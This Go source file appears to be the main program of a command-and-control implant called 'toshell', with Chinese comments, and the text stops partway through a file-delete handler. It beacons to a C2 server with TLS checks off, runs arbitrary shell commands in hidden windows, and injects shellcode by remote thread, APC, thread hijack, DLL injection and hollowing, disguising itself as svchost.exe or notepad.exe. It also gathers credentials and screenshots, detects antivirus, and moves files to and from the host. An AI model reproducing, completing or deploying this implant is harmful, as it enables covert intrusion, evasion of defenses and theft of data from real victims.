package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"toshell/internal/implant/config"
	"toshell/internal/implant/crypto"
	"toshell/internal/implant/injection"
	"toshell/internal/implant/sysinfo"
	"toshell/internal/common/protocol"

	"github.com/gorilla/websocket"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

var (
	cfg        *config.Config
	encryptor  *crypto.Encryptor
	sessionID  uint64
	serverURL  string
	interval   time.Duration
	jitter     time.Duration
	wsConn     *websocket.Conn
	encryptionKey []byte
	connMutex  sync.Mutex  // 保护 wsConn 的并发访问
)

// configBlockMagic 与 builder 中的常量保持一致
const configBlockMagic = "TOSHELL_CFG_V1:"

func main() {
	configPath := flag.String("config", "config.json", "Path to config file")
	serverFlag := flag.String("server", "", "C2 server URL")
	flag.Parse()

	var err error
	if *configPath != "" && fileExists(*configPath) {
		cfg, err = config.Load(*configPath)
		if err != nil {
			cfg = config.Default()
		}
	} else {
		cfg = config.Default()
	}

	// 尝试从自身内存中读取配置块（由 builder 追加）
	if runtimeCfg, err := readConfigBlock(); err == nil {
		if runtimeCfg.ServerURL != "" {
			cfg.ServerURL = runtimeCfg.ServerURL
		}
		if runtimeCfg.EncryptionKey != "" {
			encryptionKey, _ = base64.StdEncoding.DecodeString(runtimeCfg.EncryptionKey)
		}
	}

	if *serverFlag != "" {
		cfg.ServerURL = *serverFlag
	} else if envServerURL := os.Getenv("TOSHELL_SERVER_URL"); envServerURL != "" {
		cfg.ServerURL = envServerURL
	}

	if cfg.ServerURL == "" {
		fmt.Fprintf(os.Stderr, "No server URL specified\n")
		os.Exit(1)
	}

	serverURL = cfg.ServerURL
	interval = time.Duration(cfg.Interval) * time.Second
	jitter = time.Duration(cfg.Jitter) * time.Second

	// 使用从配置块读取的密钥，如果没有则使用默认密钥
	if len(encryptionKey) == 0 {
		encryptionKey = []byte("toshell-secret-key-1234567890123")
	}

	encryptor, err = crypto.NewAESEncryptor(encryptionKey)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create encryptor: %v\n", err)
		os.Exit(1)
	}

	sessionID = generateSessionID()

	// 改进连接逻辑：添加重试机制
	if err := connectWithRetry(); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to connect after retries: %v\n", err)
		os.Exit(1)
	}

	if err := register(); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to register: %v\n", err)
		// 不退出，继续运行
	}

	go heartbeatLoop()
	go readLoop()

	select {}
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// RuntimeConfig 运行时配置结构
type RuntimeConfig struct {
	ServerURL     string `json:"server_url"`
	EncryptionKey string `json:"encryption_key"`
}

// readConfigBlock 从自身内存中读取配置块
// 配置块格式：<magic> <4字节大端JSON长度> <JSON> <magic>
func readConfigBlock() (*RuntimeConfig, error) {
	// 获取当前进程的可执行文件路径
	exePath, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("failed to get executable path: %v", err)
	}

	// 读取可执行文件
	data, err := os.ReadFile(exePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read executable: %v", err)
	}

	return parseConfigBlockFromData(data)
}

// parseConfigBlockFromData 从二进制数据中解析配置块
func parseConfigBlockFromData(data []byte) (*RuntimeConfig, error) {
	magic := []byte(configBlockMagic)
	mlen := len(magic)

	if len(data) < mlen*2+4 {
		return nil, fmt.Errorf("data too short")
	}

	// 从末尾向前查找结束标记
	endIdx := -1
	for i := len(data) - mlen; i >= 0; i-- {
		if bytes.Equal(data[i:i+mlen], magic) {
			endIdx = i
			break
		}
	}

	if endIdx < 0 {
		return nil, fmt.Errorf("end magic not found")
	}

	// 从结束标记向前查找开始标记和长度
	if endIdx < mlen+4 {
		return nil, fmt.Errorf("invalid config block structure")
	}

	// 长度在结束标记前 4 字节处
	lenIdx := endIdx - 4
	jsonLen := binary.BigEndian.Uint32(data[lenIdx : lenIdx+4])

	// JSON 数据在长度前
	jsonStartIdx := lenIdx - int(jsonLen)
	if jsonStartIdx < mlen {
		return nil, fmt.Errorf("invalid json start index")
	}

	// 验证开始标记
	if !bytes.Equal(data[jsonStartIdx-mlen:jsonStartIdx], magic) {
		return nil, fmt.Errorf("start magic not found")
	}

	// 提取并解析 JSON
	jsonData := data[jsonStartIdx : jsonStartIdx+int(jsonLen)]
	var cfg RuntimeConfig
	if err := json.Unmarshal(jsonData, &cfg); err != nil {
		return nil, fmt.Errorf("failed to unmarshal config: %v", err)
	}

	return &cfg, nil
}

func generateSessionID() uint64 {
	var b [8]byte
	runtime.GOMAXPROCS(1)
	for i := 0; i < 8; i++ {
		b[i] = byte(time.Now().UnixNano() >> uint(i*8))
	}
	return binary.BigEndian.Uint64(b[:])
}

func connectWebSocket() error {
	wsURL, err := convertHTTPToWebSocket(serverURL)
	if err != nil {
		return fmt.Errorf("failed to convert URL: %v", err)
	}

	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	conn, _, err := dialer.Dial(wsURL, nil)
	if err != nil {
		return err
	}

	connMutex.Lock()
	wsConn = conn
	connMutex.Unlock()
	
	return nil
}

// getConnection 安全地获取 WebSocket 连接
func getConnection() *websocket.Conn {
	connMutex.Lock()
	defer connMutex.Unlock()
	return wsConn
}

// setConnection 安全地设置 WebSocket 连接
func setConnection(conn *websocket.Conn) {
	connMutex.Lock()
	defer connMutex.Unlock()
	wsConn = conn
}

// closeConnection 安全地关闭 WebSocket 连接
func closeConnection() {
	connMutex.Lock()
	defer connMutex.Unlock()
	if wsConn != nil {
		wsConn.Close()
		wsConn = nil
	}
}

// connectWithRetry 带重试机制的连接函数
func connectWithRetry() error {
	maxRetries := int(cfg.RetryCount)
	if maxRetries <= 0 {
		maxRetries = 5
	}

	for i := 0; i < maxRetries; i++ {
		if err := connectWebSocket(); err == nil {
			return nil
		}

		if i < maxRetries-1 {
			waitTime := time.Duration(cfg.RetryWait) * time.Second
			if waitTime <= 0 {
				waitTime = 5 * time.Second
			}
			time.Sleep(waitTime)
		}
	}

	return fmt.Errorf("failed to connect after %d retries", maxRetries)
}

// convertHTTPToWebSocket 将 HTTP/HTTPS URL 转换为 WS/WSS URL
func convertHTTPToWebSocket(httpURL string) (string, error) {
	u, err := url.Parse(httpURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %v", err)
	}

	scheme := u.Scheme
	switch scheme {
	case "http":
		u.Scheme = "ws"
	case "https":
		u.Scheme = "wss"
	case "ws", "wss":
		// 已经是 WebSocket URL
		return u.String(), nil
	default:
		return "", fmt.Errorf("unsupported scheme: %s", scheme)
	}

	return u.String(), nil
}

func register() error {
	info := sysinfo.GetSystemInfo()
	reg := info.ToRegister()

	payload, _ := json.Marshal(reg)

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeRegister,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}

	data := encodePacket(packet)
	compressed, _ := compress(data)
	encrypted, _ := encryptor.Encrypt(compressed)

	conn := getConnection()
	if conn == nil {
		return fmt.Errorf("no active connection")
	}

	if err := conn.WriteMessage(websocket.BinaryMessage, encrypted); err != nil {
		return err
	}

	_, respData, err := conn.ReadMessage()
	if err != nil {
		return err
	}

	decrypted, err := encryptor.Decrypt(respData)
	if err != nil {
		return err
	}

	packet, err = parsePacket(decrypted)
	if err != nil || packet == nil {
		return fmt.Errorf("invalid response")
	}

	return nil
}

func heartbeatLoop() {
	for {
		if err := heartbeat(); err != nil {
			waitTime := time.Duration(cfg.RetryWait) * time.Second
			if waitTime <= 0 {
				waitTime = 5 * time.Second
			}
			time.Sleep(waitTime)
			if err := reconnect(); err != nil {
				continue
			}
			continue
		}

		sleepTime := interval
		if jitter > 0 {
			sleepTime += time.Duration(randInt(0, int(jitter.Seconds()))) * time.Second
		}

		time.Sleep(sleepTime)
	}
}

func heartbeat() error {
	hb := protocol.Heartbeat{
		Status:     "alive",
		CPUUsage:   0,
		MemoryUsed: 0,
		Modules:    []string{},
	}

	payload, _ := json.Marshal(hb)

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeHeartbeat,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}

	data := encodePacket(packet)
	compressed, _ := compress(data)
	encrypted, _ := encryptor.Encrypt(compressed)

	conn := getConnection()
	if conn == nil {
		return fmt.Errorf("no active connection")
	}

	if err := conn.WriteMessage(websocket.BinaryMessage, encrypted); err != nil {
		return err
	}

	// 不再读取响应，避免与 readLoop 竞争导致 task 消息被误消费
	// 服务端的 heartbeat 响应（TypeAck）会被 readLoop 自然忽略
	return nil
}

func readLoop() {
	for {
		conn := getConnection()
		if conn == nil {
			time.Sleep(time.Second)
			continue
		}

		_, data, err := conn.ReadMessage()
		if err != nil {
			reconnect()
			time.Sleep(time.Second)
			continue
		}

		decrypted, err := encryptor.Decrypt(data)
		if err != nil {
			continue
		}

		packet, err := parsePacket(decrypted)
		if err != nil || packet == nil {
			continue
		}

		if packet.Type == protocol.TypeTask {
			handleTask(packet)
		}
	}
}

func handleTask(packet *protocol.Packet) {
	var task protocol.Task
	if err := json.Unmarshal(packet.Payload, &task); err != nil {
		return
	}

	result := executeTask(task)
	sendResult(task.ID, result)
}

func executeTask(task protocol.Task) protocol.Result {
	var output string
	var exitCode int32 = 0
	var errMsg string

	switch task.TaskType {
	case protocol.TaskTypeProcList:
		// Handle process list
		output, exitCode, errMsg = listProcesses()

	case protocol.TaskTypeProcInject:
		// Handle process injection
		output, exitCode, errMsg = handleProcessInject(task)

	case protocol.TaskTypeProcSpoof:
		// Handle process spoofing/hollowing
		output, exitCode, errMsg = handleProcessSpoof(task)

	case protocol.TaskTypeAutoInject:
		// Handle auto injection
		output, exitCode, errMsg = handleAutoInject(&task)

	case protocol.TaskTypeSpawn:
		// Handle child process spawning
		output, exitCode, errMsg = handleSpawn(&task)

	case "injection":
		// Handle unified injection command (from executeInjectionHandler)
		output, exitCode, errMsg = handleInjectionCommand(task)

	case protocol.TaskTypeFileList:
		// List files in a directory
		output, exitCode, errMsg = handleFileList(task)

	case protocol.TaskTypeFileDown:
		// Read and return file content
		output, exitCode, errMsg = handleFileDownload(task)

	case protocol.TaskTypeFileUp:
		// Write file to disk
		output, exitCode, errMsg = handleFileUpload(task)

	case protocol.TaskTypeFileDel:
		// Delete file or directory natively
		output, exitCode, errMsg = handleFileDelete(task)

	case protocol.TaskTypeProcKill:
		// Kill a process by PID
		output, exitCode, errMsg = handleProcessKill(task)

	case protocol.TaskTypeShell:
		// Execute shell command
		output, exitCode, errMsg = handleShell(task)

	case protocol.TaskTypeBOFLoad:
		// BOF loading
		output, exitCode, errMsg = loadBOFWS(task.Data, strings.Join(task.Args, " "))

	case "screenshot":
		// Screenshot capture
		output, exitCode, errMsg = handleScreenshot(task)

	case "credentials":
		// Credentials gathering
		output, exitCode, errMsg = handleCredentials(task)

	case "sysinfo":
		// System information gathering
		output, exitCode, errMsg = handleSysinfo()

	case "netstat":
		// Network connections
		output, exitCode, errMsg = handleNetstat()

	case protocol.TaskTypeAVDetect:
		// Security software detection
		output, exitCode, errMsg = detectSecurityProductsWS()

	default:
		// Default command execution for "command" and any unknown types
		if task.Command != "" {
			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				// 用 cmd.exe /c 包装:支持 del/copy 等 cmd 内建命令,且隐藏窗口
				cmd = exec.Command("cmd.exe", "/C", task.Command)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			} else {
				cmd = exec.Command("/bin/sh", "-c", task.Command)
			}
			cmd.Dir = os.Getenv("USERPROFILE")

			out, err := cmd.CombinedOutput()
			if err != nil {
				code := int32(-1)
				if ee, ok := err.(*exec.ExitError); ok {
					code = int32(ee.ExitCode())
				}
				exitCode = code
				errMsg = err.Error()
				if len(out) > 0 {
					if runtime.GOOS == "windows" {
						errMsg = errMsg + ": " + gbkToUTF8(string(out))
					} else {
						errMsg = errMsg + ": " + string(out)
					}
				}
			}

			output = string(out)
		} else {
			output = fmt.Sprintf("Unknown task type: %s (no command provided)", task.TaskType)
			exitCode = -1
			errMsg = "unsupported task type"
		}
	}

	return protocol.Result{
		TaskID:   task.ID,
		TaskType: task.TaskType,
		ExitCode: exitCode,
		Output:   output,
		Error:    errMsg,
	}
}

func sendResult(taskID uint64, result protocol.Result) error {
	fmt.Printf("[INFO] [implant] Sending result for task %d: exit_code=%d, output_len=%d, error=%s\n",
		taskID, result.ExitCode, len(result.Output), result.Error)

	payload, _ := json.Marshal(result)

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeResult,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}

	data := encodePacket(packet)
	compressed, _ := compress(data)
	encrypted, _ := encryptor.Encrypt(compressed)

	conn := getConnection()
	if conn == nil {
		fmt.Printf("[ERROR] [implant] No active connection for task %d\n", taskID)
		return fmt.Errorf("no active connection")
	}

	err := conn.WriteMessage(websocket.BinaryMessage, encrypted)
	if err != nil {
		fmt.Printf("[ERROR] [implant] Failed to send result for task %d: %v\n", taskID, err)
	} else {
		fmt.Printf("[INFO] [implant] Successfully sent result for task %d\n", taskID)
	}

	return err
}

func reconnect() error {
	// 关闭旧连接
	closeConnection()
	
	for i := 0; i < int(cfg.RetryCount); i++ {
		if err := connectWebSocket(); err != nil {
			waitTime := time.Duration(cfg.RetryWait) * time.Second
			if waitTime <= 0 {
				waitTime = 5 * time.Second
			}
			time.Sleep(waitTime)
			continue
		}

		if err := register(); err != nil {
			waitTime := time.Duration(cfg.RetryWait) * time.Second
			if waitTime <= 0 {
				waitTime = 5 * time.Second
			}
			time.Sleep(waitTime)
			continue
		}

		return nil
	}
	return fmt.Errorf("reconnect failed")
}

func encodePacket(packet *protocol.Packet) []byte {
	data := make([]byte, protocol.HeaderSize)
	copy(data[0:4], packet.Magic[:])
	data[4] = packet.Version
	data[5] = packet.Type

	// 设置Length字段
	length := uint32(0)
	if packet.Payload != nil {
		length = uint32(len(packet.Payload))
	}
	binary.BigEndian.PutUint32(data[6:10], length)

	binary.BigEndian.PutUint64(data[10:18], packet.ID)
	binary.BigEndian.PutUint64(data[18:26], packet.Timestamp)
	binary.BigEndian.PutUint32(data[26:30], packet.Checksum)

	if packet.Payload != nil {
		data = append(data, packet.Payload...)
	}

	return data
}

func parsePacket(data []byte) (*protocol.Packet, error) {
	if len(data) < protocol.HeaderSize {
		return nil, nil
	}

	packet := &protocol.Packet{}
	copy(packet.Magic[:], data[0:4])
	packet.Version = data[4]
	packet.Type = data[5]
	packet.Length = binary.BigEndian.Uint32(data[6:10])
	packet.ID = binary.BigEndian.Uint64(data[10:18])
	packet.Timestamp = binary.BigEndian.Uint64(data[18:26])
	packet.Checksum = binary.BigEndian.Uint32(data[26:30])

	if packet.Length > 0 && int(packet.Length) <= len(data)-protocol.HeaderSize {
		payload := make([]byte, packet.Length)
		copy(payload, data[protocol.HeaderSize:protocol.HeaderSize+packet.Length])
		packet.Payload = payload
	}

	return packet, nil
}

func randInt(min, max int) int {
	return min + mathrand.Intn(max-min)
}

func compress(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, err := w.Write(data)
	if err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func decompress(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return data, nil
	}

	if data[0] != 0x1f || data[1] != 0x8b {
		return data, nil
	}

	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer reader.Close()

	return io.ReadAll(reader)
}

func listProcesses() (string, int32, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist", "/fo", "csv")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("ps", "aux")
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to list processes: %v\n%s", err, string(output)), -1, err.Error()
	}

	outStr := string(output)
	// Convert GBK output from Windows' tasklist to UTF-8
	if runtime.GOOS == "windows" {
		outStr = gbkToUTF8(outStr)
	}
	return outStr, 0, ""
}

// gbkToUTF8 converts GBK encoded bytes to UTF-8 string
func gbkToUTF8(s string) string {
	r := strings.NewReader(s)
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Data, err := io.ReadAll(transform.NewReader(r, decoder))
	if err != nil {
		return s
	}
	return string(utf8Data)
}

// handleProcessInject handles process injection tasks
func handleProcessInject(task protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Process injection is only supported on Windows", -1, "Unsupported platform"
	}

	// Parse task data to get injection method and configuration
	var injectData struct {
		Method   string `json:"method"`
		PID      int    `json:"pid"`
		Shellcode string `json:"shellcode"`
		DLLPath  string `json:"dll_path"`
	}

	if err := json.Unmarshal([]byte(task.Data), &injectData); err != nil {
		return fmt.Sprintf("Failed to parse injection data: %v", err), -1, err.Error()
	}

	// Convert string method to InjectionMethod
	var method injection.InjectionMethod
	switch injectData.Method {
	case "remote_thread":
		method = injection.MethodRemoteThread
	case "apc":
		method = injection.MethodAPC
	case "thread_hijack":
		method = injection.MethodThreadHijack
	case "dll":
		method = injection.MethodDLLInjection
	default:
		return fmt.Sprintf("Unsupported injection method: %s", injectData.Method), -1, "Invalid method"
	}

	// Decode shellcode
	var shellcode []byte
	var err error
	if injectData.Shellcode != "" {
		shellcode, err = base64.StdEncoding.DecodeString(injectData.Shellcode)
		if err != nil {
			return fmt.Sprintf("Failed to decode shellcode: %v", err), -1, err.Error()
		}
	}

	// Create injection configuration
	config := &injection.Config{
		TargetPID:  injectData.PID,
		Shellcode:  shellcode,
		DLLPath:    injectData.DLLPath,
	}

	// Validate configuration
	if err := config.Validate(method); err != nil {
		return fmt.Sprintf("Invalid configuration: %v", err), -1, err.Error()
	}

	// Execute injection
	result, err := injection.Execute(method, config)
	if err != nil {
		return fmt.Sprintf("Injection failed: %v", err), -1, err.Error()
	}

	if result.Success {
		output := fmt.Sprintf("✅ Process injection successful!\n\n")
		output += fmt.Sprintf("Method: %s\n", method)
		output += fmt.Sprintf("Target PID: %d\n", injectData.PID)
		if result.ProcessID != 0 {
			output += fmt.Sprintf("Process ID: %d\n", result.ProcessID)
		}
		if result.ThreadID != 0 {
			output += fmt.Sprintf("Thread ID: %d\n", result.ThreadID)
		}
		output += fmt.Sprintf("\n🎯 Shellcode has been injected and is running!")
		return output, 0, ""
	} else {
		return fmt.Sprintf("❌ Process injection failed: %s", result.Error), -1, result.Error
	}
}

// handleProcessSpoof handles process spoofing/hollowing tasks
func handleProcessSpoof(task protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Process spoofing is only supported on Windows", -1, "Unsupported platform"
	}

	// Parse task data to get spoofing method and configuration
	var spoofData struct {
		Method     string `json:"method"`
		TargetPath string `json:"target_path"`
		ParentPID  int    `json:"parent_pid"`
		Shellcode  string `json:"shellcode"`
	}

	if err := json.Unmarshal([]byte(task.Data), &spoofData); err != nil {
		return fmt.Sprintf("Failed to parse spoofing data: %v", err), -1, err.Error()
	}

	// Convert string method to InjectionMethod
	var method injection.InjectionMethod
	switch spoofData.Method {
	case "process_hollowing":
		method = injection.MethodProcessHollowing
	case "early_bird":
		method = injection.MethodEarlyBird
	default:
		return fmt.Sprintf("Unsupported spoofing method: %s", spoofData.Method), -1, "Invalid method"
	}

	// Decode shellcode
	var shellcode []byte
	var err error
	if spoofData.Shellcode != "" {
		shellcode, err = base64.StdEncoding.DecodeString(spoofData.Shellcode)
		if err != nil {
			return fmt.Sprintf("Failed to decode shellcode: %v", err), -1, err.Error()
		}
	}

	// Create spoofing configuration
	config := &injection.Config{
		TargetPath: spoofData.TargetPath,
		Shellcode:  shellcode,
		ParentPID:  spoofData.ParentPID,
	}

	// Validate configuration
	if err := config.Validate(method); err != nil {
		return fmt.Sprintf("Invalid configuration: %v", err), -1, err.Error()
	}

	// Execute spoofing
	result, err := injection.Execute(method, config)
	if err != nil {
		return fmt.Sprintf("Spoofing failed: %v", err), -1, err.Error()
	}

	if result.Success {
		output := fmt.Sprintf("🎭 Process spoofing successful!\n\n")
		output += fmt.Sprintf("Method: %s\n", method)
		output += fmt.Sprintf("Target: %s\n", spoofData.TargetPath)
		if spoofData.ParentPID > 0 {
			output += fmt.Sprintf("Parent PID: %d\n", spoofData.ParentPID)
		}
		if result.ProcessID != 0 {
			output += fmt.Sprintf("New Process ID: %d\n", result.ProcessID)
		}
		output += fmt.Sprintf("\n👻 New process created and running your shellcode!")
		output += fmt.Sprintf("\n🔍 It appears as a legitimate %s process to observers.", filepath.Base(spoofData.TargetPath))
		return output, 0, ""
	} else {
		return fmt.Sprintf("❌ Process spoofing failed: %s", result.Error), -1, result.Error
	}
}

// handleAutoInject handles automatic injection tasks
func handleAutoInject(task *protocol.Task) (string, int32, string) {
	// Parse auto inject data
	var injectData struct {
		TargetPID  uint32 `json:"target_pid"`
		Method     string `json:"method"`
		Shellcode  string `json:"shellcode"`
		AutoMode   bool   `json:"auto_mode"`
	}

	if err := json.Unmarshal([]byte(task.Data), &injectData); err != nil {
		return fmt.Sprintf("Failed to parse auto inject data: %v", err), -1, err.Error()
	}

	fmt.Printf("[executor] Auto injection task received: PID=%d, Method=%s, AutoMode=%v\n", 
		injectData.TargetPID, injectData.Method, injectData.AutoMode)

	// Decode shellcode
	var shellcode []byte
	var err error
	if injectData.Shellcode != "" {
		shellcode, err = base64.StdEncoding.DecodeString(injectData.Shellcode)
		if err != nil {
			return fmt.Sprintf("Failed to decode shellcode: %v", err), -1, err.Error()
		}
		fmt.Printf("[executor] Shellcode decoded successfully: %d bytes\n", len(shellcode))
	}

	// 关键修改：优先使用 Process Hollowing 或 Early Bird APC
	// 这样新进程完全独立，不受旧进程影响
	method := injection.MethodProcessHollowing
	
	if injectData.Method != "" {
		// 如果指定了方法，尝试使用指定的方法
		if m, err := parseInjectionMethod(injectData.Method); err == nil {
			// 但优先使用创建新进程的方法
			if m == injection.MethodProcessHollowing || m == injection.MethodEarlyBird {
				method = m
			} else {
				// 其他方法改为 Process Hollowing（创建新进程）
				fmt.Printf("[executor] Converting method %s to Process Hollowing for process independence\n", injectData.Method)
				method = injection.MethodProcessHollowing
			}
		}
	}

	// 选择目标进程
	var targetPath string
	switch method {
	case injection.MethodProcessHollowing:
		targetPath = "C:\\Windows\\System32\\svchost.exe"
	case injection.MethodEarlyBird:
		targetPath = "C:\\Windows\\System32\\notepad.exe"
	}

	fmt.Printf("[executor] Using method: %s, target path: %s\n", method, targetPath)

	// Create injection command
	cmd := &injection.Command{
		Method:     method.String(),
		Shellcode:  injectData.Shellcode,
		TargetPath: targetPath,
	}

	// Execute the injection
	result, err := injection.ExecuteCommandStruct(cmd)
	if err != nil {
		fmt.Printf("[executor] Auto injection failed: %v\n", err)
		return fmt.Sprintf("❌ Auto injection failed: %v", err), -1, err.Error()
	}

	if !result.Success {
		fmt.Printf("[executor] Auto injection returned failure: %s\n", result.Error)
		return fmt.Sprintf("❌ Auto injection failed: %s", result.Error), -1, result.Error
	}

	// Build success message
	output := fmt.Sprintf("⚡ Auto injection successful!\n\n")
	output += fmt.Sprintf("Method: %s\n", method)
	output += fmt.Sprintf("Target Path: %s\n", targetPath)
	if result.ProcessID != 0 {
		output += fmt.Sprintf("Process ID: %d\n", result.ProcessID)
	}
	if result.ThreadID != 0 {
		output += fmt.Sprintf("Thread ID: %d\n", result.ThreadID)
	}
	output += fmt.Sprintf("\n🎯 Shellcode executed successfully!")
	output += fmt.Sprintf("\n📊 New process created and running independently!")
	output += fmt.Sprintf("\n✅ New session will survive even if parent process terminates!")

	fmt.Printf("[executor] Auto injection completed successfully: Method=%s, PID=%d\n", 
		method, result.ProcessID)
	
	return output, 0, ""
}

// handleSpawn spawns a child process with complete independence from parent
// This ensures the child process survives even if the parent terminates
func handleSpawn(task *protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Spawn is only supported on Windows", -1, "Unsupported platform"
	}

	// Parse spawn data
	var spawnData struct {
		ExeData  string `json:"exe_data"`  // Base64 encoded EXE binary
		FileName string `json:"file_name"` // Optional: custom filename
	}

	if err := json.Unmarshal([]byte(task.Data), &spawnData); err != nil {
		return fmt.Sprintf("Failed to parse spawn data: %v", err), -1, err.Error()
	}

	if spawnData.ExeData == "" {
		return "No EXE data provided", -1, "Missing exe_data"
	}

	// Decode the EXE binary
	exeBinary, err := base64.StdEncoding.DecodeString(spawnData.ExeData)
	if err != nil {
		return fmt.Sprintf("Failed to decode EXE data: %v", err), -1, err.Error()
	}

	fmt.Printf("[executor] Spawn task received: EXE size=%d bytes\n", len(exeBinary))

	// Generate temp file path
	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.Getenv("TMP")
	}
	if tempDir == "" {
		tempDir = "."
	}

	fileName := spawnData.FileName
	if fileName == "" {
		// Generate random filename
		fileName = fmt.Sprintf("implant_%d.exe", mathrand.Uint32())
	}

	exePath := filepath.Join(tempDir, fileName)

	// Write EXE to disk
	if err := os.WriteFile(exePath, exeBinary, 0755); err != nil {
		return fmt.Sprintf("Failed to write EXE file: %v", err), -1, err.Error()
	}

	fmt.Printf("[executor] EXE written to: %s\n", exePath)

	// Spawn the process with CREATE_BREAKAWAY_FROM_JOB flag
	// This ensures the child process is completely independent
	cmd := exec.Command(exePath)
	
	// Set up process attributes for Windows
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x01000000 | syscall.CREATE_NEW_PROCESS_GROUP, // CREATE_BREAKAWAY_FROM_JOB
	}

	// Do NOT inherit handles from parent process
	// This prevents socket handle inheritance
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	// Start the process
	if err := cmd.Start(); err != nil {
		// Clean up the file if spawn failed
		os.Remove(exePath)
		return fmt.Sprintf("Failed to spawn process: %v", err), -1, err.Error()
	}

	spawnedPID := cmd.Process.Pid
	fmt.Printf("[executor] Process spawned successfully: PID=%d\n", spawnedPID)

	// Release the process handle (don't wait for it)
	cmd.Process.Release()

	// Build success message
	output := fmt.Sprintf("✅ Child process spawned successfully!\n\n")
	output += fmt.Sprintf("Process ID: %d\n", spawnedPID)
	output += fmt.Sprintf("EXE Path: %s\n", exePath)
	output += fmt.Sprintf("EXE Size: %d bytes\n", len(exeBinary))
	output += fmt.Sprintf("\n🎯 Process is completely independent from parent!\n")
	output += fmt.Sprintf("📊 Child process will survive even if parent terminates!\n")
	output += fmt.Sprintf("✅ New session will connect independently to C2!\n")

	fmt.Printf("[executor] Spawn completed successfully: PID=%d\n", spawnedPID)

	return output, 0, ""
}

// parseInjectionMethod 解析注入方法字符串
func parseInjectionMethod(name string) (injection.InjectionMethod, error) {
	switch strings.ToLower(name) {
	case "process_hollowing", "hollowing", "hollow":
		return injection.MethodProcessHollowing, nil
	case "early_bird", "earlybird", "early-bird":
		return injection.MethodEarlyBird, nil
	case "remote_thread", "remotethread", "remote-thread":
		return injection.MethodRemoteThread, nil
	case "apc", "queueapc":
		return injection.MethodAPC, nil
	case "thread_hijack", "threadhijack", "thread-hijack":
		return injection.MethodThreadHijack, nil
	case "dll", "dll_injection", "dllinjection":
		return injection.MethodDLLInjection, nil
	default:
		return injection.MethodProcessHollowing, fmt.Errorf("unknown method: %s", name)
	}
}

// ─── File Operations ─────────────────────────────────────────────────────────────

// handleFileList lists files in a directory
func handleFileList(task protocol.Task) (string, int32, string) {
	dirPath := task.Path
	if dirPath == "" {
		dirPath = "."
	}

	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return "", -1, err.Error()
	}

	var files []protocol.FileInfo
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		files = append(files, protocol.FileInfo{
			Name:    entry.Name(),
			Size:    info.Size(),
			IsDir:   entry.IsDir(),
			ModTime: info.ModTime().Format(time.RFC3339),
			Mode:    info.Mode().String(),
		})
	}

	result := protocol.FileListResult{
		Path:  dirPath,
		Files: files,
	}
	data, _ := json.Marshal(result)
	return string(data), 0, ""
}

// handleFileDownload reads a file and returns base64-encoded content
func handleFileDownload(task protocol.Task) (string, int32, string) {
	filePath := task.Path
	if filePath == "" {
		return "", -1, "no file path provided"
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", -1, err.Error()
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	return encoded, 0, ""
}

// handleFileUpload writes data to a file
func handleFileUpload(task protocol.Task) (string, int32, string) {
	filePath := task.Path
	if filePath == "" {
		return "", -1, "no file path provided"
	}

	// Data is expected to be base64-encoded
	decoded, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		// Try as raw data
		decoded = []byte(task.Data)
	}

	if err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {
		return "", -1, err.Error()
	}

	if err := os.WriteFile(filePath, decoded, 0644); err != nil {
		return "", -1, err.Error()
	}

	return fmt.Sprintf("File uploaded: %s (%d bytes)", filePath, len(decoded)), 0, ""
}

// handleFileDelete removes a file or directory recursively using native APIs
func handleFileDelete(task protocol.Task) (string, int32, string) {
	filePath := task.Path
	if filePath == "" {
		return "", -1, "no file path provided"
	}

